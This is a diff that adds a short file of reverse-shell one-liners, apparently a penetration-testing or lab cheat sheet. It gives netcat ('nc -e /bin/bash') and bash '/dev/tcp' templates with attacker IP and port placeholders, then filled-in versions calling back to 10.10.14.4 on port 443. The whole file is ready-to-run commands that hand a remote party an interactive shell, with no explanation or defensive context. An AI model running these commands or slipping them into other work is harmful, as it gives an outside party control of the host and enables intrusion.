@@ -1,0 +1,9 @@
+#Netcat
+#nc -e /bin/bash <attacker IP> <attacker port>
+
+nc -e /bin/bash 10.10.14.4 443
+
+#Bash
+#bash -i >& /dev/tcp/<attacker IP>/<attacker port> 0>&1
+
+bash -i >& /dev/tcp/10.10.14.4/443 0>&1
